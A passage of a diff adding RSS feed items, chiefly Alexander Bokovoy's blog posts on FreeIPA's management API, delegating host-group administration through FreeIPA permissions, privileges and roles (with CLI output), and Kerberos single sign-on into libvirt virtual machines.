+	<description>&lt;p&gt;FreeIPA Web UI provides a browser for discovering application programming interface (API) since version FreeIPA 4.2. However, the API itself is not yet officially supported and there is no documentation on how to access it. Some time ago I wrote a blog post detailing on how to access the API from an external client, like &lt;code&gt;curl&lt;/code&gt; utility. &lt;a href=&quot;https://vda.li/en/posts/2015/05/28/talking-to-freeipa-api-with-sessions/&quot;&gt;The blog post&lt;/a&gt; was quite popular and allowed to create bindings to FreeIPA API in Perl and other languages. However, the blog post assumed you know what you are doing. In order to help those starting from scratch, I wrote a larger article, &lt;a href=&quot;https://vda.li/en/docs/freeipa-management-in-a-nutshell&quot;&gt;FreeIPA management API a nutshell&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;The article is available in a new documentation section so that it stays independent of the blog. I plan to extend the API documentation and add more details later. The document assumes you are using FreeIPA 4.4 or later which is available in upcoming Fedora 25 and RHEL 7.3 releases.&lt;/p&gt;</description>
+	<pubDate>Wed, 02 Nov 2016 14:00:00 +0000</pubDate>
+</item>
+<item>
+	<title>Alexander Bokovoy: Creating permissions in FreeIPA</title>
+	<guid>https://vda.li/en/posts/2016/08/30/Creating-permissions-in-FreeIPA/</guid>
+	<link>https://vda.li/en/posts/2016/08/30/Creating-permissions-in-FreeIPA/</link>
+	<description>&lt;p&gt;FreeIPA has quite flexible system to define access rights for any resources in
+the LDAP store. The system consists of three different parts:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;a permission object&lt;/li&gt;
+  &lt;li&gt;a privilege object, and&lt;/li&gt;
+  &lt;li&gt;a role object.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Permission object specifies the target of the access grant: what attributes of
+which objects in LDAP would be subject of the checks.&lt;/p&gt;
+
+&lt;p&gt;A privilege allows to combine several permissions together in a logical task. A
+role defines who can have access to privileges.&lt;/p&gt;
+
+&lt;p&gt;An example below is a somewhat complex use of the permission system to allow
+groups of administrators to manage specific hosts. We want administrators in
+group ‘my-admins’ to manage hosts in ‘my-hostgroup’ but otherwise have no other
+privileges.&lt;/p&gt;
+
+&lt;p&gt;Let’s start with a host group ‘my-hostgroup’:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;# ipa hostgroup-add my-hostgroup
+-----------------------------
+Added hostgroup &quot;my-hostgroup&quot;
+-----------------------------
+  Host-group: my-hostgroup
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;And with a group ‘my-admins’:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;# ipa group-add my-admins
+-----------------------
+Added group &quot;my-admins&quot;
+-----------------------
+  Group name: my-admins
+  GID: 903200040
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;A member of ‘my-admins’ should be able to edit all attributes of the hosts in
+the host group ‘my-hostgroup’.&lt;/p&gt;
+
+&lt;p&gt;To manage permissions, use &lt;code&gt;ipa permission&lt;/code&gt; family of commands. You need to
+create a basic permission which applies to hosts:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;# ipa permission-add manage-my-hostgroup --right=all --bindtype=permission --type=host
+--------------------------------------
+Added permission &quot;manage-my-hostgroup&quot;
+--------------------------------------
+  Permission name: manage-my-hostgroup
+  Granted rights: all
+  Bind rule type: permission
+  Subtree: cn=computers,cn=accounts,dc=ipa,dc=ad,dc=test
+  Type: host
+  Permission flags: V2, SYSTEM
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;A permission automatically generates an access control item (ACI) in the LDAP.
+To check all low-level details of the permission, use &lt;code&gt;--all&lt;/code&gt; and &lt;code&gt;--raw&lt;/code&gt;
+options:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;# ipa permission-show --all --raw manage-my-hostgroup
+  dn: cn=manage-my-hostgroup,cn=permissions,cn=pbac,dc=ipa,dc=ad,dc=test
+  cn: manage-my-hostgroup
+  ipapermright: all
+  ipapermbindruletype: permission
+  ipapermlocation: cn=computers,cn=accounts,dc=ipa,dc=ad,dc=test
+  ipapermtargetfilter: (objectclass=ipahost)
+  ipapermissiontype: V2
+  ipapermissiontype: SYSTEM
+  aci: (targetfilter = &quot;(objectclass=ipahost)&quot;)
+       (version 3.0; acl &quot;permission:manage-my-hostgroup&quot;;
+                     allow (all)
+                     groupdn = &quot;ldap:///cn=manage-my-hostgroup,cn=permissions,cn=pbac,dc=ipa,dc=ad,dc=test&quot;;)
+  objectclass: ipapermission
+  objectclass: top
+  objectclass: groupofnames
+  objectclass: ipapermissionv2
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;As you can see, it applies to hosts: cn=computers,cn=accounts,$SUFFIX
+subtree, and target filter is set to (objectclass=ipahost). So it would
+apply to any host. To further limit the permission, you have to add more
+target filters.&lt;/p&gt;
+
+&lt;p&gt;To define raw target filter, we need to know a DN of the hostgroup that
+will be our target limit:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;# ipa hostgroup-show --raw --all my-hostgroup
+  dn: cn=my-hostgroup,cn=hostgroups,cn=accounts,dc=ipa,dc=ad,dc=test
+  cn: my-hostgroup
+  ipaUniqueID: 6d8c72f2-6e6d-11e6-b9e4-525400bf08fe
+  mepManagedEntry: cn=my-hostgroup,cn=ng,cn=alt,dc=ipa,dc=ad,dc=test
+  objectClass: ipahostgroup
+  objectClass: ipaobject
+  objectClass: nestedGroup
+  objectClass: groupOfNames
+  objectClass: top
+  objectClass: mepOriginEntry
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Using the DN of the &lt;code&gt;my-hostgroup&lt;/code&gt;, we can now add a filter to the
+permission:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;# ipa permission-mod manage-my-hostgroup --filter '(memberOf=cn=my-hostgroup,cn=hostgroups,cn=accounts,dc=ipa,dc=ad,dc=test)'
+-----------------------------------------
+Modified permission &quot;manage-my-hostgroup&quot;
+-----------------------------------------
+  Permission name: manage-my-hostgroup
+  Granted rights: all
+  Bind rule type: permission
+  Subtree: cn=computers,cn=accounts,dc=ipa,dc=ad,dc=test
+  Extra target filter: (memberOf=cn=my-hostgroup,cn=hostgroups,cn=accounts,dc=ipa,dc=ad,dc=test)
+  Type: host
+  Permission flags: V2, SYSTEM
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Take a look at the permission in detail:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;# ipa permission-show --all --raw manage-my-hostgroup
+  dn: cn=manage-my-hostgroup,cn=permissions,cn=pbac,dc=ipa,dc=ad,dc=test
+  cn: manage-my-hostgroup
+  ipapermright: all
+  ipapermbindruletype: permission
+  ipapermlocation: cn=computers,cn=accounts,dc=ipa,dc=ad,dc=test
+  ipapermtargetfilter: (objectclass=ipahost)
+  ipapermtargetfilter: (memberOf=cn=my-hostgroup,cn=hostgroups,cn=accounts,dc=ipa,dc=ad,dc=test)
+  ipapermissiontype: V2
+  ipapermissiontype: SYSTEM
+  aci: (targetfilter = &quot;(&amp;amp;(memberOf=cn=my-hostgroup,cn=hostgroups,cn=accounts,dc=ipa,dc=ad,dc=test)(objectclass=ipahost))&quot;)
+       (version 3.0;acl &quot;permission:manage-my-hostgroup&quot;;
+        allow (all) groupdn = &quot;ldap:///cn=manage-my-hostgroup,cn=permissions,cn=pbac,dc=ipa,dc=ad,dc=test&quot;;)
+  objectclass: ipapermission
+  objectclass: top
+  objectclass: groupofnames
+  objectclass: ipapermissionv2
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Our ACI says: “Allow any changes to be done in all objects of
+objectclass ipahost that belong to a host group &lt;code&gt;my-hostgroup&lt;/code&gt; to members
+of the permission group &lt;code&gt;manage-my-hostgroup&lt;/code&gt;”&lt;/p&gt;
+
+&lt;p&gt;Now you can add the &lt;code&gt;manage-my-hostgroup&lt;/code&gt; permission to a new privilege
+and add that privilege to a role, and then assign users of the group &lt;code&gt;my-admins&lt;/code&gt;
+to that role. Those users will be able to manage hosts targeted by the permission.&lt;/p&gt;
+
+&lt;p&gt;Start with a privilege:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;# ipa privilege-add 'manage-hostgroup-my-hostgroup'
+-----------------------------------------------
+Added privilege &quot;manage-hostgroup-my-hostgroup&quot;
+-----------------------------------------------
+  Privilege name: manage-hostgroup-my-hostgroup
+
+# ipa privilege-add-permission 'manage-hostgroup-my-hostgroup'
+[permission]: manage-my-hostgroup
+  Privilege name: manage-hostgroup-my-hostgroup
+  Permissions: manage-my-hostgroup
+-----------------------------
+Number of permissions added 1
+-----------------------------
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Finally, create a role and add a privilege to it, and then add members that could
+use the privilege:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;# ipa role-add role-manage-hostgroup-my-hostgroup
+-----------------------------------------------
+Added role &quot;role-manage-hostgroup-my-hostgroup&quot;
+-----------------------------------------------
+  Role name: role-manage-hostgroup-my-hostgroup
+
+# ipa role-add-privilege role-manage-hostgroup-my-hostgroup
+[privilege]: manage-hostgroup-my-hostgroup
+  Role name: role-manage-hostgroup-my-hostgroup
+  Privileges: manage-hostgroup-my-hostgroup
+----------------------------
+Number of privileges added 1
+----------------------------
+
+# ipa role-add-member role-manage-hostgroup-my-hostgroup --groups=my-admins
+  Role name: role-manage-hostgroup-my-hostgroup
+  Member groups: my-admins
+  Privileges: manage-hostgroup-my-hostgroup
+-------------------------
+Number of members added 1
+-------------------------
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;If we look at the original permission, we can see it is now an indirect member
+of a role:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;# ipa permission-show manage-my-hostgroup
+  Permission name: manage-my-hostgroup
+  Granted rights: all
+  Bind rule type: permission
+  Subtree: cn=computers,cn=accounts,dc=ipa,dc=ad,dc=test
+  Extra target filter: (memberOf=cn=my-hostgroup,cn=hostgroups,cn=accounts,dc=ipa,dc=ad,dc=test)
+  Type: host
+  Permission flags: V2, SYSTEM
+  Granted to Privilege: manage-hostgroup-my-hostgroup
+  Indirect Member of roles: role-manage-hostgroup-my-hostgroup
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;When user is added to the &lt;code&gt;my-admins&lt;/code&gt; group, it automatically assumes a role
+that allows to manage the host group:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;# ipa user-add hadmin
+First name: Joe
+Last name: Doe
+-------------------
+Added user &quot;hadmin&quot;
+-------------------
+  User login: hadmin
+  First name: Joe
+  Last name: Doe
+  Full name: Joe Doe
+  Display name: Joe Doe
+  Initials: JD
+  Home directory: /home/hadmin
+  GECOS: Joe Doe
+  Login shell: /bin/sh
+  Principal name: hadmin@IPA.AD.TEST
+  Principal alias: hadmin@IPA.AD.TEST
+  Email address: hadmin@ipa.ad.test
+  UID: 903200041
+  GID: 903200041
+  Password: False
+  Member of groups: ipausers
+  Kerberos keys available: False
+
+# ipa group-add-member my-admins --users=hadmin
+  Group name: my-admins
+  GID: 903200040
+  Member users: hadmin
+  Roles: role-manage-hostgroup-my-hostgroup
+-------------------------
+Number of members added 1
+-------------------------
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;In real life scenario we would probably like to tune our permission a bit more.
+For example, we definitely don’t want to allow full access to all attributes of
+the host – if users can write to &lt;code&gt;objectclass&lt;/code&gt; attribute, they can turn that
+host into anything else in LDAP. But before tuning it, we need to see if our
+permission actually works:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;# kinit hadmin
+Password for hadmin@IPA.AD.TEST:
+
+# ipa host-mod my-host --random
+ipa: ERROR: Insufficient access: Insufficient 'write' privilege to the 'userPassword' 
+            attribute of entry 'fqdn=my-host.ipa.ad.test,cn=computers,cn=accounts,dc=ipa,dc=ad,dc=test'.
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Oops, it does not work – we cannot write to a &lt;code&gt;userPassword&lt;/code&gt; attribute of the
+host. What is wrong? To answer this question we need to look at the
+documentation of the LDAP server FreeIPA builds upon: &lt;a href=&quot;http://www.port389.org/&quot;&gt;389-ds&lt;/a&gt;.
+&lt;a href=&quot;https://access.redhat.com/documentation/en-US/Red_Hat_Directory_Server/10/html/Administration_Guide/Managing_Access_Control-Creating_ACIs_Manually.html#Defining_Targets-Targeting_Entries_or_Attributes_Using_LDAP_Filters&quot;&gt;Red Hat Directory Server Administration Guide&lt;/a&gt; 
+says the following in the section “Targeting Entries or Attributes Using LDAP Filters”:&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Note
+Although using LDAP filters can be useful when you are targeting entries and
+attributes that are spread across the directory, the results are sometimes
+unpredictable because filters do not directly name the object for which you
+are managing access. The set of entries targeted by a filtered ACI is likely
+to change as attributes are added or deleted. Therefore, if you use LDAP
+filters in ACIs, you should verify that they target the correct entries and
+attributes by using the same filter in an ldapsearch operation.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;The documentation doesn’t tell this explicitly, but when &lt;code&gt;targetattr&lt;/code&gt; is missing, the
+default for matching target attributes when matching with target filter for
+modification is &lt;code&gt;none&lt;/code&gt;, not &lt;code&gt;*&lt;/code&gt;. This is done to deny &lt;code&gt;modrdn&lt;/code&gt; (entry rename).&lt;/p&gt;
+
+&lt;p&gt;To allow modification of the host entries, we need to list attributes which
+can be modified by our host group admins. The list below is an example only: it
+allows to set meta-data about the host, change one-time enrollment password,
+assigned ID view, add certificates and SSH public keys. One needs to carefully review
+what attributes should be allowed to modify.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;# kinit admin
+Password for admin@IPA.AD.TEST: 
+
+# ipa permission-mod manage-my-hostgroup --attrs={'userPassword','description','l',\
+               'nshardwareplatform','nsosversion','usercertificate','userclass',\
+               'macaddress','ipaassignedidview','ipasshpubkey'}
+-----------------------------------------
+Modified permission &quot;manage-my-hostgroup&quot;
+-----------------------------------------
+  Permission name: manage-my-hostgroup
+  Granted rights: all
+  Effective attributes: description, ipaassignedidview, ipakrbauthzdata, ipasshpubkey,
+                        l, macaddress, nshardwareplatform, nsosversion, userPassword,
+                        usercertificate, userclass
+  Bind rule type: permission
+  Subtree: cn=computers,cn=accounts,dc=ipa,dc=ad,dc=test
+  Extra target filter: (memberOf=cn=my-hostgroup,cn=hostgroups,cn=accounts,dc=ipa,dc=ad,dc=test)
+  Type: host
+  Permission flags: V2, SYSTEM
+  Granted to Privilege: manage-hostgroup-my-hostgroup
+  Indirect Member of roles: role-manage-hostgroup-my-hostgroup
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;With these changes, our admin can now set a random one-time password:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;# kinit hadmin
+Password for hadmin@IPA.AD.TEST:
+
+# ipa host-mod my-host --random
+-----------------------
+Modified host &quot;my-host&quot;
+-----------------------
+  Host name: my-host.ipa.ad.test
+  Random password: 5Krkbj_eW7UR@SUxj0lx22
+  Principal name: host/my-host.ipa.ad.test@IPA.AD.TEST
+  Principal alias: host/my-host.ipa.ad.test@IPA.AD.TEST
+  Password: True
+  Member of host-groups: my-hostgroup
+  Keytab: False
+  Managed by: my-host.ipa.ad.test
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;However, this is not all. The permission we created above doesn’t answer a very
+important question: how the host &lt;code&gt;my-host&lt;/code&gt; would appear in the host group? We
+surely want to be able to add and remove hosts from the host group.  But if we
+create a permission that allows per-hostgroup admins to add and remove members
+of the host group at will, they could take over any host – by simply adding it
+in the host group they manage.&lt;/p&gt;
+
+&lt;p&gt;An easiest way to solve this problem, no surprise, is organizational: do not
+give host group admin rights to include hosts to the hostgroup or delete them,
+only allow them to manage what’s in the host group.&lt;/p&gt;
+
+&lt;p&gt;A separation of rights requires to create a separate permission for ‘add’/’del’
+rights against ‘member’ attribute that would allow to include/remove hosts.
+That’s easy but it would not allow us to limit &lt;em&gt;what&lt;/em&gt; hosts could be
+added/removed from the host group.&lt;/p&gt;
+
+&lt;p&gt;Unfortunately, to make that possible, permission-add/permission-mod
+should be extended to allow specifying target attribute’s values like
+described in the &lt;a href=&quot;https://access.redhat.com/documentation/en-US/Red_Hat_Directory_Server/10/html/Administration_Guide/Managing_Access_Control-Creating_ACIs_Manually.html#Defining_Targets-Targeting_Attribute_Values_Using_LDAP_Filters&quot;&gt;RHDS Administration Guide&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;Even then to define something like this, we’d need to have specific
+naming of hosts to be able to specify a pattern as a ‘member’ attribute
+value.&lt;/p&gt;
+
+&lt;p&gt;An alternative is to use automembership rules, defined with &lt;code&gt;ipa automember&lt;/code&gt;
+family of commands. It might work with predictable host names but would
+probably be hard to implement in case of host names coming out of existing
+cloud provider where you don’t have control over the undercloud.&lt;/p&gt;
+
+&lt;p&gt;This is why I’m saying it is an organizational issue, not really a
+technical one.&lt;/p&gt;</description>
+	<pubDate>Tue, 30 Aug 2016 05:00:00 +0000</pubDate>
+</item>
+<item>
+	<title>Alexander Bokovoy: Single sign-on into virtual machines on Linux</title>
+	<guid>https://vda.li/en/posts/2016/05/30/Single-sign-on-to-virtual-machines/</guid>
+	<link>https://vda.li/en/posts/2016/05/30/Single-sign-on-to-virtual-machines/</link>
+	<description>&lt;p&gt;This weekend I looked into making possible a single sign-on into Fedora 24
+guests running on libvirt/KVM. Suppose you have a libvirt-based server where a
+number VMs is deployed with VMs presenting graphical workstations. This
+is not far from what ovirt.org does (RHEV product). You want to have
+both your virtualization infrastructure and OS environments in VMs to be
+enrolled into FreeIPA and thus accessible with single sign-on from an
+external client.&lt;/p&gt;
+
+&lt;p&gt;There are several layers of single sign-on here. Once you signed into
+your external client, supposedly you have valid Kerberos credentials
+that can be used to obtain service tickets to other services in the
+realm.&lt;/p&gt;
+
+&lt;p&gt;Second layer is the connectivity to your virtualization infrastructure.
+This is possible already with libvirtd/Qemu as they both support SASL
+authentication. It is matter of setting appropriate configuration
+variables in /etc/libvirt/libvirtd.conf and /etc/libvirt/qemu.conf, and
+tuning /etc/sasl2/libvirt.conf and /etc/sasl2/qemu.conf to allow SASL
+GSSAPI authentication. You also need to create appropriate services in
+FreeIPA (libvirt/hostname, vnc/hostname, and spice/hostname) and obtain
+actual keys with ipa-getkeytab. This is all described relatively well in
+&lt;a href=&quot;http://www.freeipa.org/page/Libvirt_with_VNC_Consoles&quot;&gt;the FreeIPA libvirt howto&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;Once configured, one can authenticate with SASL GSSAPI to VNC server
+using virt-manager UI or other VNC clients in GNOME that use gtk-vnc
+library. This works pretty well but only gives you access to the actual
+screen of the VM, not single sign-on into an operating system in the VM.&lt;/p&gt;
+
+&lt;p&gt;SPICE, on other hand, does not work with SASL GSSAPI. While SPICE server
+embedded into Qemu can be configured easily to listen for SASL GSSAPI,
+SPICE client libraries in GNOME don’t actually support SASL GSSAPI. In
+fact, the code is there, it is copied from gtk-vnc, but it does not
+work.&lt;/p&gt;
+
+&lt;p&gt;SPICE client code lacks actual sequence to obtain Kerberos identity out
+of existing ticket in a default credentials cache. As result, instead of
+authenticating with SASL GSSAPI, a user is left with a request to enter
+‘server password’ which is a concept built around existing SPICE
+authentication approach where both client and server share a single
+password.&lt;/p&gt;
+
+&lt;p&gt;After I fixed this problem by inquiring a Kerberos principal from the
+default ccache, SPICE is now working well in a way similar to VNC. I’ll
+submit patch to upstream once I have time for that.&lt;/p&gt;
+
+&lt;p&gt;This still doesn’t give any chance to actually log-in to the VM because
+both VNC and SPICE servers only represent fancy screens/input devices
+for the VMs. There is no existing way to pass through authentication via
+SPICE or VNC so that a software running in the VM would accept Kerberos
+ticket and authenticate a user based on that.&lt;/p&gt;
+
+&lt;p&gt;Here a concept of guest agent is introduced. Qemu has its own guest
+agent (&lt;a href=&quot;https://github.com/qemu/qemu/tree/master/qga&quot;&gt;here&lt;/a&gt;) which only supports
+a minimal set of commands needed to make virtualization management
+working. OVirt/RHEV have their own guest agent
+&lt;a href=&quot;https://github.com/oVirt/ovirt-guest-agent/&quot;&gt;here&lt;/a&gt; that supports much more
+than QEmu’s version and has own protocol. Finally, SPICE has own agent,
+vdagent, that supports even more operations related to use of graphical
+resources within the VM.&lt;/p&gt;
+
+&lt;p&gt;The idea behind these agents is to have a separate trusted channel into
+VM that can be used to query/execute something inside the VM. OVirt guest
+agent supports logon into the VM by plugging into PAM stack and into
+graphical greeters. When user asks OVirt portal to logon into a console of
+a VM, a login request can also be sent to the guest agent. This request
+doesn’t really present a single sign-on, as user have to enter actual
+credentials and then guest agent injects them into GDM, KDM, or console
+via D-Bus.&lt;/p&gt;
+
+&lt;p&gt;SPICE vdagent can inject both keyboard and mouse events, and even has
+systemd-login integration that allows it to query sessions to know which
+X session is used by which user so that mouse/keyboard events are
+properly injected. It doesn’t though, have a way to force GNOME GDM to
+create a new session automatically based on the credentials
+authenticated by the SPICE server.&lt;/p&gt;
+
+&lt;p&gt;It would, perhaps, be a good path forward to hack both SPICE server and
+vdagent to make possible use of delegated GSSAPI credentials to perform
+a logon into GDM. This would require support from GDM too but as OVirt
+experience shows, it is possible to create a GDM plugin to help with the
+task. The goal is to have such logon triggered on opening of the SPICE
+session if GDM is running and no session is available yet. As result of
+such logon, valid Kerberos credentials would need to appear in the
+system so that further use of them would be possible. This means
+delegation of the credentials – something that SPICE or VNC doesn’t
+support either (but SASL GSSAPI allows to achieve, it is a single flag
+change and a policy at KDC to define).&lt;/p&gt;
+
+&lt;p&gt;There is another technology to remotely access other systems – RDesktop
+protocol. XFreeRDP project has experimental patches to support GSSAPI.
+They don’t work yet, but I have good progress on them to make SSO
+possible.&lt;/p&gt;
+
+&lt;p&gt;So in the end, current implementations don’t allow actual single sign-on in a
+way that would allow using Kerberos credentials in and out of VMs. To make that
+possible, more work is needed. It looks like extending vdagent to be able to
+pass Kerberos ccache content to SSSD via PAM sessiona and trigger that from the
+greeter plugins as developed in OVirt we could actually reach the point with
+less effort than creating something from scratch.&lt;/p&gt;</description>
+	<pubDate>Mon, 30 May 2016 15:41:00 +0000</pubDate>
 </item>
 <item>
 	<title>Simo Sorce: Distributing Secrets with Custodia</title>
